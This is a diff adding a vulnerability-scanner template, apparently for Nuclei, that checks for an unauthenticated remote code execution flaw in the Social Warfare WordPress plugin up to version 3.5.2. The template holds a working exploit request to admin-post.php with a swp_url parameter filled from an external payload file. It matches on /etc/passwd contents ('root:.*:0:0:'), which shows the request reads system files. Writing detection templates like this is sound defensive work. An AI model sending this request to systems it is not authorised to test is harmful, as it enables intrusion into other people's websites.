@@ -1,0 +1,47 @@
+http:
+    - matchers:
+        - part: body
+          regex:
+            - 'root:.*:0:0:'
+          type: regex
+        - part: body
+          type: word
+          words:
+            - No changes made
+        - status:
+            - 500
+          type: status
+      matchers-condition: and
+      payloads:
+        path: helpers/payloads/wp-social-warfare-rce.txt
+      raw:
+        - |
+          GET /wp-admin/admin-post.php?swp_debug=load_options&swp_url={{path}} HTTP/1.1
+          Host: {{Hostname}}
+id: wp-social-warfare-rce
+info:
+    author: theamanrawat
+    classification:
+        cpe: cpe:2.3:a:warfareplugins:social_warfare:*:*:*:*:wordpress:*:*:*
+    description: |
+        Unauthenticated remote code execution has been discovered in functionality that handles settings import.
+    metadata:
+        max-request: 1
+        product: social_warfare
+        publicwww-query: /wp-content/plugins/social-warfare/
+        vendor: warfareplugins
+        verified: true
+    name: Social Warfare <= 3.5.2 - Remote Code Execution
+    reference:
+        - https://wpscan.com/vulnerability/9259
+        - https://wordpress.org/plugins/social-warfare/
+    remediation: Fixed in version 3.5.3
+    severity: critical
+    tags:
+        - wordpress
+        - wpscan
+        - wp-plugin
+        - wp
+        - social-warfare
+        - WordPress
+        - authenticate
